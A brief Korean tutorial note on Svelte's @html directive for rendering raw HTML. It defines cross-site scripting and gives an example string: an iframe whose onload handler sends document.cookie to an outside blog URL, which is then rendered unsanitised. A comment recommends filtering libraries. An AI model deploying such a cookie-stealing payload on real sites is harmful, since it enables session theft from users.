# 2. 원시 HTML

- `@` 기호는 `at-sign`이라고 부른다.
- html로 해석돼서 들어가야하는 문자열이 있으면 보간법 내부에서 앞쪽에 `@html` 키워드를 붙여준다.
- XSS(Cross Site Scripting, 사이트 간 스크립팅)은 웹 취약점 중 하나로 웹사이트 관리자가 아닌 제3자가 웹에 악성 스크립트를 삽입할 수 있는 것을 의미한다.

```html
<script lang="ts">
  const h1 = "<h1>Hello Heropy</h1>";
  // documnet.cookie에 로그인 정보가 담겨있다고 가정 -> XSS 공격 가능
  // 내용을 필터링할 수 있는 라이브러리 사용하는 것이 좋다.
  const xss =
    '<iframe onload="document.location=`https://heropy.blog?${documnet.cookie}`"></iframe>';
</script>
```

```jsx
{@html h1}

{@html xss}
```
